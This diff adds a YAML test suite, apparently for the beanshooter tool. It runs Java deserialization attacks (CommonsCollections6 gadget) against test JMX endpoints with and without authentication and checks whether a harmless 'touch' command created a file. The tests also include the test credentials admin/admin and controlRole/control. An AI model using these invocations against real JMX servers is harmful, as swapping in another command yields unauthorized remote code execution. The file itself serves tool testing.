@@ -1,0 +1,199 @@
+tester:
+  title: serial action (RMI)
+  description: |-
+    Perform tests on beanshooters serial action for RMI based connections
+
+  id: '01-06-01'
+  groups:
+    - rmi
+  id_pattern: '01-06-01-{:02}'
+
+
+  variables:
+    file: serial-rce.txt
+
+
+tests:
+  - title: Unauth deserialization
+    description: |-
+      Perform a deserialization attack on a JMX endpoint that does not require
+      authentication
+
+    command:
+      - beanshooter
+      - serial
+      - ${TARGET_UNAUTH}
+      - ${OPTIONS}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - MBeanServer attempted to deserialize the DeserializationCanary class
+            - Deserialization attack was probably successful
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
+
+
+  - title: Plain deserialization
+    description: |-
+      Perform a deserialization attack on a JMX endpoint that does require
+      PLAIN authentication
+
+    command:
+      - beanshooter
+      - serial
+      - ${TARGET_PLAIN}
+      - ${OPTIONS}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Caught AuthenticationException while connecting to the JMX service
+            - The targeted JMX endpoint probably requires authentication
+            - Use the --preauth option to launch deserialization attacks before authentication
+      - file_exists:
+          cleanup: True
+          invert:
+            - '${volume}/${file}'
+
+
+  - title: Plain deserialization (preauth)
+    description: |-
+      Perform a deserialization attack on a JMX endpoint that does require
+      PLAIN authentication. Use --preauth to perform the attack before authentication
+
+    command:
+      - beanshooter
+      - serial
+      - ${TARGET_PLAIN}
+      - ${OPTIONS}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+      - --preauth
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - MBeanServer attempted to deserialize the DeserializationCanary class
+            - Deserialization attack was probably successful
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
+
+
+  - title: Plain deserialization (credentials)
+    description: |-
+      Perform a deserialization attack on a JMX endpoint that does require
+      PLAIN authentication and specify valid credentials for the attack
+
+    command:
+      - beanshooter
+      - serial
+      - ${TARGET_PLAIN}
+      - ${OPTIONS}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+      - --username
+      - admin
+      - --password
+      - admin
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - MBeanServer attempted to deserialize the DeserializationCanary class
+            - Deserialization attack was probably successful
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
+
+
+  - title: JMX deserialization
+    description: |-
+      Perform a deserialization attack on a JMX endpoint that does require
+      JMX authentication
+
+    command:
+      - beanshooter
+      - serial
+      - ${TARGET_JMX}
+      - ${OPTIONS}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Caught AuthenticationException while connecting to the JMX service
+            - The targeted JMX endpoint probably requires authentication
+            - Use the --preauth option to launch deserialization attacks before authentication
+      - file_exists:
+          invert:
+            - '${volume}/${file}'
+
+
+  - title: JMX deserialization (preauth)
+    description: |-
+      Perform a deserialization attack on a JMX endpoint that does require
+      JMX authentication. Use --preauth to perform the attack before authentication.
+      This should fail, as the server is patched.
+
+    command:
+      - beanshooter
+      - serial
+      - ${TARGET_JMX}
+      - ${OPTIONS}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+      - --preauth
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Server appears to be not vulnerable to preauth deserialization attacks
+      - file_exists:
+          invert:
+            - '${volume}/${file}'
+
+
+  - title: JMX deserialization (credentials)
+    description: |-
+      Perform a deserialization attack on a JMX endpoint that does require
+      JMX authentication and specify valid credentials for the attack
+
+    command:
+      - beanshooter
+      - serial
+      - ${TARGET_JMX}
+      - ${OPTIONS}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+      - --username
+      - controlRole
+      - --password
+      - control
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - MBeanServer attempted to deserialize the DeserializationCanary class
+            - Deserialization attack was probably successful
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
